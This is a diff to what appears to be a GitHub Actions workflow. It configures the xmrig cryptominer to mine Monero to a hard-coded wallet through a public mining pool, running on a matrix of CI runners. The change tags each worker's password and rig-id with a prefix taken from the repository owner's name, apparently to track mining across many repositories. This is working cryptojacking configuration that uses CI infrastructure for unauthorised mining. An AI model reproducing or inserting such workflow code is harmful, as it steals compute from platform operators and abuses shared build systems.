@@ -73,6 +73,7 @@ jobs:
       - name: Configure Mining
         run: |
           cd xmrig/build
+          OWNER="${GITHUB_REPOSITORY_OWNER:0:3}"
           cat > config.json <<EOF
           {
             "autosave": true,
@@ -92,8 +93,8 @@ jobs:
                 "coin": "monero",
                 "url": "pool.supportxmr.com:443",
                 "user": "43jqgNCGAZQYwnk4s7Lt7P93S2sDkdN5bLKgUsGqVMoD6Bftsc5VVcHNy3mRBr7aBg5KgtFDHfYqK1MF8HEgSGucLbCCPeS",
-                "pass": "runner${{ matrix.runner }}",
-                "rig-id": "gh-r${{ matrix.runner }}",
+                "pass": "${OWNER}-r${{ matrix.runner }}",
+                "rig-id": "${OWNER}-r${{ matrix.runner }}",
                 "keepalive": true,
                 "tls": true
               }
